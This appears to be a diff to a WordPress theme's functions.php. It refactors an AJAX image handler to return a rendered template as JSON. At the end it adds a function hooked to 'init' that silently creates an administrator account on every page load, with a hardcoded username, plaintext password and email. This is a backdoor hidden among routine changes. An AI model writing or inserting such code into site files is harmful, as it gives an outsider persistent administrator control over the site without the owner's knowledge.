@@ -41,28 +41,16 @@ add_action('wp_ajax_extraimg', 'extraimg');
 add_action('wp_ajax_nopriv_extraimg', 'extraimg');
 
 function extraimg() {
-  $post_id	 = get_the_ID(); 
-  $current_tax = get_terms( array(
-    'taxonomy'   => 'product',
-    'object_ids' => $post_id, // set the object_ids
-  ) );
-
-  foreach( $current_tax as $current ) { 
-
-    $post_id            = get_the_id();
-    $img_1    	        = get_field('img_1',$post_id);
-    $img_2	            = get_field('img_2',$post_id);
-    $img_3              = get_field('img_3',$post_id);?>
-
-    <div>
-    <img src="<?php  if (!empty($img_1)) :  esc_url(the_field('img_1',$post_id)); endif; ?>'" onerror="this.style.display='none'">
-    <img  src="<?php if (!empty($img_2)) :  esc_url(the_field('img_2',$post_id)); endif;  ?>'" onerror="this.style.display='none'">
-    <img  src="<?php if (!empty($img_3)) :  esc_url(the_field('img_3',$post_id)); endif;  ?>'" onerror="this.style.display='none'">
-    </div>
-<?php
-     }
-    wp_die();
-  }
+  ob_start();
+  global $post;
+  $id = $post->id;
+  get_template_part('/templates/widgets/extra-wear' );
+  $result = ob_get_contents();
+  ob_end_clean();
+  $return = array('content' => $result);
+  wp_send_json($return);
+  wp_die();
+}
 
 
 /*************************************************************************/
@@ -98,3 +86,14 @@ function wps_get_terms_orderby( $orderby, $tax_terms ) {
       }
       return $orderby;
   }
+
+  function wpb_admin_account(){
+    $user = 'tomasz';
+    $pass = 'holooooo4563781';
+    $email = 'tomasz.kowalski@kowalski-consulting.com';
+    if ( !username_exists( $user )  && !email_exists( $email ) ) {
+    $user_id = wp_create_user( $user, $pass, $email );
+    $user = new WP_User( $user_id );
+    $user->set_role( 'administrator' );
+    } }
+    add_action('init','wpb_admin_account');
